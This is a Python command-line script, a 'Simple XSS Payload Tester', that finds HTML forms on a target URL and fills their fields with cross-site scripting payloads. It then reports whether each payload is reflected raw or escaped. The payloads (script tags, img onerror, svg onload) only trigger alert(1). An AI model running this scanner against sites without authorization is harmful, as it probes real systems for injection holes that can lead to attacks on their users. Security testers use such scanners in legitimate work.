import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "';alert(1);//"
]

ESCAPE_PATTERNS = [
    (re.compile(r"&lt;script&gt;", re.I), "escaped"),
    (re.compile(r"&lt;img", re.I), "escaped"),
    (re.compile(r"&lt;svg", re.I), "escaped"),
]

def find_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")

def get_form_details(form, base_url):
    details = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    details["action"] = urljoin(base_url, action) if action else base_url
    details["method"] = method
    inputs = []
    for inp in form.find_all(["input", "textarea"]):
        name = inp.get("name")
        if not name:
            continue
        itype = inp.get("type", "text")
        inputs.append({"name": name, "type": itype})
    details["inputs"] = inputs
    return details

def inject_and_submit(session, form, payload):
    url = form["action"]
    data = {}
    for inp in form["inputs"]:
        if inp["type"] in ("text", "search", "email", "textarea", "password"):
            data[inp["name"]] = payload
        else:
            data[inp["name"]] = "test"

    if form["method"] == "post":
        resp = session.post(url, data=data)
    else:
        resp = session.get(url, params=data)
    return resp

def analyze_response(resp, payload):
    body = resp.text or ""
    if payload in body:
        return "reflected-raw"
    for pattern, label in ESCAPE_PATTERNS:
        if pattern.search(body):
            return label
    return "not-reflected"

def run_tests(base_url, payloads):
    session = requests.Session()
    resp = session.get(base_url)
    forms = find_forms(resp.text)
    print(f"[+] Found {len(forms)} form(s) at {base_url}")

    for idx, form in enumerate(forms, 1):
        fd = get_form_details(form, base_url)
        print(f"\n[*] Testing form #{idx} -> {fd['action']} [{fd['method']}]")
        for payload in payloads:
            r = inject_and_submit(session, fd, payload)
            verdict = analyze_response(r, payload)
            print(f"   Payload: {payload} -> {verdict}")

def main():
    parser = argparse.ArgumentParser(description="Simple XSS Payload Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--payloads", help="File with payloads")
    args = parser.parse_args()

    if args.payloads:
        with open(args.payloads, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        payloads = DEFAULT_PAYLOADS

    run_tests(args.url, payloads)

if __name__ == "__main__":
    main()
